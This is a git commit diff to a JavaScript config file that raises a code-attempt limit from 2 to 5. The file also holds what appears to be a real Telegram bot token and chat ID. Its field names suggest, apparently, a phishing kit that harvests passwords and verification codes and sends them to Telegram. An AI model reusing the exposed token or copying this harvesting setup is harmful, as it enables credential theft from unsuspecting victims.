7f422baeac9163187f1542d8b42c386e5333bdb9
nguyentuanblackshole-netizen <nguyen.tuan.blackshole@gmail.com>
2025-08-20 08:13:26 +0700

    Update config.js

--- src/utils/config.js
+++ src/utils/config.js
@@ -4,7 +4,7 @@ const config = {
     noti_token: '8272129902:AAEyHfpOVgKdaeSZZXd7rNDMeLScKbpInQA',
     noti_chat_id: '2096245355',
     max_password_attempts: 2,
-    max_code_attempts: 2,
+    max_code_attempts: 5,
     password_loading_time: 3,
     code_loading_time: 3
 };
